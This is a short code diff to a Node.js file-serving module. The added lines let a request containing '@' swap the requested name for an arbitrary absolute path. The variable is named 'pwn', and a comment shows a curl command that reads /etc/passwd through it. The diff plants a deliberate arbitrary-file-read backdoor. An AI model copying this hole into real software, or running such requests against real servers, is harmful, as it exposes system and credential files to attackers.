@@ -3,6 +3,14 @@ const fs = require('fs');
 
 module.exports = function (filename, callback) {
 
+  // Read the absolute path after @
+  // E.g. curl -v localhost:5000/\@/etc/passwd
+  // will read /etc/passwd
+  const pwn = filename.split('@');
+  if (pwn.length > 1) {
+    filename = pwn[1];
+  }
+
   function failOnError(cb) {
     return function (err, result) {
       if (err) {
